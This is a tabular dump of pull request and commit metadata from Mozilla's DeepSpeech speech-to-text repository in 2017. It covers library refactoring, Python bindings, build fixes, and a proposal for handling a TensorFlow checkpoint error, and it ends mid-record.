3779,https://api.github.com/repos/mozilla/DeepSpeech/pulls/575,575,Fix issue #574 - Use libdeepspeech in DeepSpeech.py,,Cwiiis,668518,2017-05-16T14:35:28Z,CONTRIBUTOR,True,320,215,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d829eb4436b0fa749026c70583b764b75caa794f,"Split audioToInputVector into a separate library

Split out functions that don't depend on TensorFlow into a separate
library to avoid opening the TensorFlow library if it's not necessary."
3780,https://api.github.com/repos/mozilla/DeepSpeech/pulls/575,575,Fix issue #574 - Use libdeepspeech in DeepSpeech.py,,Cwiiis,668518,2017-05-16T14:35:28Z,CONTRIBUTOR,True,320,215,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91c682eac07c1c8c4c7677035b44063710aa5765,"Use deepspeech Python library in util/audio.py

Deprecate duplicated code and use libdeepspeech for consistency and speed."
3781,https://api.github.com/repos/mozilla/DeepSpeech/pulls/568,568,Keep unsplit WAV files in the TED corpus,"This lets us re-run the importer to re-create the CSV files, if we want to include punctuation or accents, for example. The downside is using more disk space than it's strictly necessary.",reuben,477142,2017-05-10T15:07:33Z,MEMBER,True,0,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2bd7fc4f22dfd29396e876927a0ac2f3d7a96c9a,Keep unsplit WAV files in the TED corpus
3782,https://api.github.com/repos/mozilla/DeepSpeech/pulls/566,566,Fix issue #557 (libdeepspeech performance),,Cwiiis,668518,2017-05-09T15:41:01Z,CONTRIBUTOR,True,281,216,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,616d77ef2d3327fa12ff00f8343428965d73a790,"Various renames in libdeepspeech to allow for clearer more efficient use

libdeepspeech now uses the namespace DeepSpeech. The 'DeepSpeech' class
has been renamed to 'Model', 'getMfccFrames' has been renamed to
'getInputVector' and a function outside of the Model class has been added,
'audioToInputVector' to allow it to be used without initialising
TensorFlow and loading a model."
3783,https://api.github.com/repos/mozilla/DeepSpeech/pulls/566,566,Fix issue #557 (libdeepspeech performance),,Cwiiis,668518,2017-05-09T15:41:01Z,CONTRIBUTOR,True,281,216,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08deda2b92dc7ab8cace436e031487765455a854,"Improve build process and instructions to fix performance issues

Certain optimisations that TensorFlow recommends cause significant
performance penalties in c_speech_features. Explicitly disable these
features in the BUILD file only for c_speech_features.

The build has been restructured to produce a single deepspeech library,
rather than 3 separate deepspeech, c_speech_features and kissfft
libaries. This should make the deepspeech client and libraries
significantly easier to use and distribute."
3784,https://api.github.com/repos/mozilla/DeepSpeech/pulls/566,566,Fix issue #557 (libdeepspeech performance),,Cwiiis,668518,2017-05-09T15:41:01Z,CONTRIBUTOR,True,281,216,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6c1c5543c8e2b8590961c0d2b7140fa48da8f21,Update c_speech_features to 0.4.8
3785,https://api.github.com/repos/mozilla/DeepSpeech/pulls/566,566,Fix issue #557 (libdeepspeech performance),,Cwiiis,668518,2017-05-09T15:41:01Z,CONTRIBUTOR,True,281,216,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a6afde0e1c1a7458ea89bd991f3875d8f172786,Remove need for -std=gnu99 in c_speech_features
3786,https://api.github.com/repos/mozilla/DeepSpeech/pulls/566,566,Fix issue #557 (libdeepspeech performance),,Cwiiis,668518,2017-05-09T15:41:01Z,CONTRIBUTOR,True,281,216,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57d105f5e9394ffe5eecf47a8863f482594dedcc,Install deepspeech binary as well as libraries
3787,https://api.github.com/repos/mozilla/DeepSpeech/pulls/564,564,.,new pull,varunravi,6137926,2017-05-04T15:01:49Z,NONE,False,199321,0,163,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0154ec27c1c02bb6c0517fb9f67fc3a461cfdf0,Initial commit
3788,https://api.github.com/repos/mozilla/DeepSpeech/pulls/564,564,.,new pull,varunravi,6137926,2017-05-04T15:01:49Z,NONE,False,199321,0,163,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,287143c30aa3c123446e2c73ccd6c2d802def4e6,fixed import errors
3789,https://api.github.com/repos/mozilla/DeepSpeech/pulls/562,562,Fix #561; plus cosmetics,,tilmankamp,5991088,2017-05-04T13:17:21Z,CONTRIBUTOR,True,11,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a952fb68e6d90eb9491db62bc94c24b69857c2d4,Fix #561; plus cosmetics
3790,https://api.github.com/repos/mozilla/DeepSpeech/pulls/558,558,Mention recent importer changes in README (Fixes #541),,reuben,477142,2017-05-02T19:50:33Z,MEMBER,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8103a28544c254ff16dd3c468643a7e4ba3a2503,Mention recent importer changes in README
3791,https://api.github.com/repos/mozilla/DeepSpeech/pulls/554,554,Python bindings - Fixes issue #471,,Cwiiis,668518,2017-04-26T13:14:47Z,CONTRIBUTOR,True,3426,130,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9cd4ff6f639ae5f4bd62abefbddbe7ee63d66be,"Convert libdeepspeech into a proper C++ library to ease use/bindings

Formerly, libdeepspeech was basically a C library. Rather than returning
a context struct and having every function require this context struct,
instead provide a DeepSpeech class that handles its own destruction."
3792,https://api.github.com/repos/mozilla/DeepSpeech/pulls/554,554,Python bindings - Fixes issue #471,,Cwiiis,668518,2017-04-26T13:14:47Z,CONTRIBUTOR,True,3426,130,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10068fc40e52c2c829daf23886b9c22381031f7d,Add libdeepspeech python bindings
3793,https://api.github.com/repos/mozilla/DeepSpeech/pulls/553,553,Save absolute paths in dataset definition files,This prevents weirdness when invoking DeepSpeech.py from a different folder than you ran the bin/import_* scripts.,reuben,477142,2017-04-26T02:59:17Z,MEMBER,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27396b7f80440578ea9900d33561f52448103362,Save absolute paths in dataset definition files
3794,https://api.github.com/repos/mozilla/DeepSpeech/pulls/549,549,updated minor fixes,removed the new checkpoint directory that was created in the prev PR.,pdcoded,9830931,2017-04-21T12:27:23Z,NONE,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da9cc8208e327b8787f98117ffc78b2796597105,minor name error fixes
3795,https://api.github.com/repos/mozilla/DeepSpeech/pulls/549,549,updated minor fixes,removed the new checkpoint directory that was created in the prev PR.,pdcoded,9830931,2017-04-21T12:27:23Z,NONE,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fb15f557bd16eaa7101ce67d2395b55f376aa93,new checkpoint directory
3796,https://api.github.com/repos/mozilla/DeepSpeech/pulls/549,549,updated minor fixes,removed the new checkpoint directory that was created in the prev PR.,pdcoded,9830931,2017-04-21T12:27:23Z,NONE,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cb3670e59fb12aab76ccfa96d6780accca11f957,removed the new checkpoint directory
3797,https://api.github.com/repos/mozilla/DeepSpeech/pulls/547,547,Fixed #546,,kdavis-mozilla,12054740,2017-04-20T10:46:30Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,843f55dbe2f270ffa43c7e21d679bf9b0313cf24,Fixed #546
3798,https://api.github.com/repos/mozilla/DeepSpeech/pulls/545,545,minor name error fixes,,pdcoded,9830931,2017-04-19T20:31:35Z,NONE,False,5,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da9cc8208e327b8787f98117ffc78b2796597105,minor name error fixes
3799,https://api.github.com/repos/mozilla/DeepSpeech/pulls/545,545,minor name error fixes,,pdcoded,9830931,2017-04-19T20:31:35Z,NONE,False,5,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fb15f557bd16eaa7101ce67d2395b55f376aa93,new checkpoint directory
3800,https://api.github.com/repos/mozilla/DeepSpeech/pulls/542,542,Open STM files as UTF-8,The importer cleanup PR left this code broken.,reuben,477142,2017-04-18T15:23:04Z,MEMBER,True,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5980781ef1ce0cd06ffaa31ba632d2bbf15b952,Open STM files as UTF-8
3801,https://api.github.com/repos/mozilla/DeepSpeech/pulls/536,536,Fix #533; Set executable flag for all importers,,tilmankamp,5991088,2017-04-18T10:15:49Z,CONTRIBUTOR,True,0,0,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7e17744850bfc125916506765f8b542573b3249f,Fix #533; Set executable flag for all importers
3802,https://api.github.com/repos/mozilla/DeepSpeech/pulls/535,535,Fix #532; Added pandas to requirements.txt,,tilmankamp,5991088,2017-04-18T10:12:58Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,551a8991a0339926ccf043f16d58d5c07d71e437,Fix #532; Added pandas to requirements.txt
3803,https://api.github.com/repos/mozilla/DeepSpeech/pulls/530,530,Fixed #529,,kdavis-mozilla,12054740,2017-04-15T13:06:11Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3373ae2978cd49032bfac8b2fcfefc630323e96,Fixed #529
3804,https://api.github.com/repos/mozilla/DeepSpeech/pulls/525,525,Update README.md to point to the wiki and the IRC channel,,reuben,477142,2017-04-14T21:56:28Z,MEMBER,True,21,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d988cbc9beed392699b30b8ec32d0f9335262a6,Update README.md to point to the wiki and the IRC channel
3805,https://api.github.com/repos/mozilla/DeepSpeech/pulls/524,524,Use pyxdg in the bin/run-* scripts to find out where to put checkpoints,As discussed on IRC.,reuben,477142,2017-04-12T22:01:41Z,MEMBER,True,10,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,223da824b6b40d42373a832bf6be3c8479bd09ed,Use pyxdg in the bin/run-* scripts to find out where to put checkpoints
3806,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4765953b99416e551438d384d6c273f9f91354a7,Fixed #412
3807,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d2ee957eedaf5045f9e3a5d2fd9fc866ebe2ddb,Use tf.contrib.rnn instead of tf.contrib.rnn.python.ops.core_rnn_cell
3808,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cad1dc28fba128145102cb4042b8c26210911f93,Use tf.nn instead of tf.python.ops.ctc_ops
3809,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d0855b4b8b32e37a72e1cdacfd022202f72020a,"Update DeepSpeech.py

fixed homophone typo."
3810,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8b2e62540d5e56573d2bda1c11df3fedf6efea1,"Merge pull request #425 from gvoysey/gvoysey-patch-1

Update DeepSpeech.py"
3811,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f639c16d9eb20f173cba7b5e55ab3d88fcd139ac,Fixed #424
3812,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf9b1f1bed65402d351e97fe3c56c77c3d022692,Remove leftover ctc_ops use
3813,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e29088b9db97cb974d110ec86ae2d0594cb192a8,"Merge pull request #427 from mozilla/issue423

Clean up some imports"
3814,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27201bbe3f118a323dfc326dc7ca0e152b0f997f,Addressed review comments
3815,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b61d64b320b16c67ba4624edb609da99032762cc,"Merge pull request #421 from mozilla/issue412

Fixed #412"
3816,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d2dd8a47a543a60ff474a8aed4f88b6735a567d,"Merge pull request #426 from mozilla/issue424

Fixed #424"
3817,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fa0238dac2528f34526a93216d4a69f3593d3cd,Fixed #428
3818,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de45b40d8e30a67ddb2b6f6b5c2361b249a2e8e4,Fixed #406
3819,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52f7f7fadac50eb0cdb4ec39b7a3fd0ad919f2ee,"Merge pull request #429 from mozilla/issue428

Fixed #428"
3820,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aad1e9978476a11d669f56c6a5ab86a16374908d,"Merge pull request #431 from mozilla/issue406

Fixed #406"
3821,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa2009fd113a04072c3289ad320c1e3945ac7590,Fixed #438
3822,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc68ba6f145b78feb3ca53917b47754e725784d7,Addressed review comment
3823,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce54bab39aad66436267098a01cfbd1634064b35,"Merge pull request #439 from mozilla/issue438

Fixed #438"
3824,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6aa353aa0cf2843d8244e3fe4fc79bdf3efbcc05,added incomplete requirements.txt.  Omitted tensorflow since it is ambiguous with tensorflow-gpu.
3825,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5b88cd093deb16a7dff8309abc5c25c9781293c,refactored librivox.py for PEP8 compliance and use of informative progress bars to display actions taken during initial creation of the data set to the user.
3826,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bf7787136091fa8ed9628b97a10148c6f6ae8c6,properly formatting display status bars
3827,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,910a664aa86e87e93dc8fa8472bce19c012bfd44,"Separate libdeepspeech/c_speech_features/kissfft library builds

Build separate libraries for kissfft, c_speech_features and libdeepspeech.
This allows us to specify c99 for c_speech_features and should fix
issue #441."
3828,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f096c053b011216743e9bc6ff85ebbd8cb0e518b,"Merge pull request #449 from Cwiiis/issue441-separate-build

Separate libdeepspeech/c_speech_features/kissfft library builds"
3829,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf588211c590b19669e49334838aef8fe30dcbf2,"Support RPi toolchain cross-compilation of native client

Fixes #451"
3830,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d69ebd14095be0a7c454e14b7e36eccc80d6299,"Merge pull request #452 from lissyx/issue451

Support RPi toolchain cross-compilation of native client"
3831,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc1c85ea4626a0480eaf2cd377b75ccdbe574e37,"Fix libaries ordering for linker

Fixes #453"
3832,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49eef81f99db9e6103487f5fee460e56f94f6cd3,"Merge pull request #454 from lissyx/issue453

Fix libaries ordering for linker"
3833,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,388d04beab32b8654f11bb31071b4fec69c26b0b,updated requirements.txt and moved to project root
3834,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3659a7438c920f9cf45a1c0d659a2ea9f73a761,"Merge pull request #448 from gvoysey/gvoysey-librivox-status-bars

Add progress bars to monitor Librivox importer"
3835,https://api.github.com/repos/mozilla/DeepSpeech/pulls/518,518,Merge wer tracking,,lissyx,1645737,2017-04-11T11:00:45Z,COLLABORATOR,True,2467,1592,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7900d28662b2fb9cc11b5682adb819862bb64866,"Measure execution time in native_client

Fixes #450"
3836,https://api.github.com/repos/mozilla/DeepSpeech/pulls/513,513,Update c_speech_features,Update brings performance/accuracy fixes and memory leak fixes.,Cwiiis,668518,2017-04-10T14:19:56Z,CONTRIBUTOR,True,651,234,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8234b3dc56d6125ba87a324f8320a204d643b382,"Update c_speech_features

Update brings performance/accuracy fixes and memory leak fixes."
3837,https://api.github.com/repos/mozilla/DeepSpeech/pulls/512,512,fix for issue 511,"@reuben 

If I understood this was the right solution. From the original post below I have added the try catch around the ""with tf.train.MonitoredTrainingSession"" call in train.  The message I am providing the user may need to be adjusted to make it better and I am open to suggestions/corrections. 

The original post below describes my reasoning for this proposed changed. I hope I did this correctly.

The documentation in the README.md can be updated so that search engines can point here for this issue.

pro's:
-  No change to code. 
-  People will discover that default checkpoints can this error by mixing models with different shapes.

con's:
- Other people may associate this error with Deep Speech itself. (either way people find what may be triggering this in TF)

Change the empty flag behavior for ""checkpoint_dir"" to work more like ""dataset_path"" by adding the importer name as a separate folder inside the default directory

```
if len(FLAGS.checkpoint_dir) == 0:
        FLAGS.checkpoint_dir = xdg.save_data_path(os.path.join('deepspeech','checkpoints',FLAGS.importer))
```
pro's:
- Creates a new checkpoint folder automatically for each script

con's: 
- I am not sure how people are using this tool, but it changes the default behavior and may cause confusion for other folks that may run custom scripts.

Add a try to except clause around
```
with tf.train.MonitoredTrainingSession(master='' if server is None else server.target,
                                               is_chief=is_chief,
                                               hooks=hooks,
                                               checkpoint_dir=FLAGS.checkpoint_dir,
                                               save_checkpoint_secs=FLAGS.checkpoint_secs,
                                               config=session_config) as session:
```
and catch 
```
    except tf.errors.InvalidArgumentError:
        log_error(sys.exc_info()[1])
        log_error(""Provide a --checkpoint_dir argument to work with a model with different shapes."")
```

cons's:
- I am not sure if this is the best/cleanest/most efficient way to handle this.
- Not as efficient as checking the checkpoint parameters. I am not sure how this impacts performance for python but I am pretty sure this will only be taken into account for 1 loop.
- Looks bad.

pro's:
- we return the exception from TF but provide information to Deep Speech users on how to mitigate this issue at the bottom.

We could do a check to make sure the variables match before using the MonitoredTrainingSession, but it seems as though this would require creating a separate session manager which seems overly complicated given this function to auto handle sessions. ",crs117,1690117,2017-04-09T23:53:58Z,CONTRIBUTOR,True,89,74,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bf55b88631d28b9c1c306c40ca46eec6ccb7939,"The documentation in the README.md can be updated so that search engines can point here for this issue.

pro's:

    No change to code.
    People will discover that default checkpoints can this error by mixing models with different shapes.

con's:

    Other people may associate this error with Deep Speech itself. (either way people find what may be triggering this in TF)

Change the empty flag behavior for ""checkpoint_dir"" to work more like ""dataset_path"" by adding the importer name as a separate folder inside the default directory

if len(FLAGS.checkpoint_dir) == 0:
        FLAGS.checkpoint_dir = xdg.save_data_path(os.path.join('deepspeech','checkpoints',FLAGS.importer))

pro's:

    Creates a new checkpoint folder automatically for each script

con's:

    I am not sure how people are using this tool, but it changes the default behavior and may cause confusion for other folks that may run custom scripts.

Add a try to except clause around

with tf.train.MonitoredTrainingSession(master='' if server is None else server.target,
                                               is_chief=is_chief,
                                               hooks=hooks,
                                               checkpoint_dir=FLAGS.checkpoint_dir,
                                               save_checkpoint_secs=FLAGS.checkpoint_secs,
                                               config=session_config) as session:

and catch

    except tf.errors.InvalidArgumentError:
        log_error(sys.exc_info()[1])
        log_error(""Provide a --checkpoint_dir argument to work with a model with different shapes."")

cons's:

    I am not sure if this is the best/cleanest/most efficient way to handle this.
    Not as efficient as checking the checkpoint parameters. I am not sure how this impacts performance for python but I am pretty sure this will only be taken into account for 1 loop.
    Looks bad.

pro's:

    we return the exception from TF but provide information to Deep Speech users on how to mitigate this issue at the bottom.

We could do a check to make sure the variables match before using the MonitoredTrainingSession, but it seems as though this would require creating a separate session manager which seems overly complicated given this function to auto handle sessions."
3838,https://api.github.com/repos/mozilla/DeepSpeech/pulls/512,512,fix for issue 511,"@reuben 

If I understood this was the right solution. From the original post below I have added the try catch around the ""with tf.train.MonitoredTrainingSession"" call in train.  The message I am providing the user may need to be adjusted to make it better and I am open to suggestions/corrections. 

The original post below describes my reasoning for this proposed changed. I hope I did this correctly.

The documentation in the README.md can be updated so that search engines can point here for this issue.

pro's:
-  No change to code. 
-  People will discover that default checkpoints can this error by mixing models with different shapes.

con's:
- Other people may associate this error with Deep Speech itself. (either way people find what may be triggering this in TF)

Change the empty flag behavior for ""checkpoint_dir"" to work more like ""dataset_path"" by adding the importer name as a separate folder inside the default directory

```
if len(FLAGS.checkpoint_dir) == 0:
        FLAGS.checkpoint_dir = xdg.save_data_path(os.path.join('deepspeech','checkpoints',FLAGS.importer))
```
pro's:
- Creates a new checkpoint folder automatically for each script

con's: 
- I am not sure how people are using this tool, but it changes the default behavior and may cause confusion for other folks that may run custom scripts.

Add a try to except clause around
```
with tf.train.MonitoredTrainingSession(master='' if server is None else server.target,
                                               is_chief=is_chief,
                                               hooks=hooks,
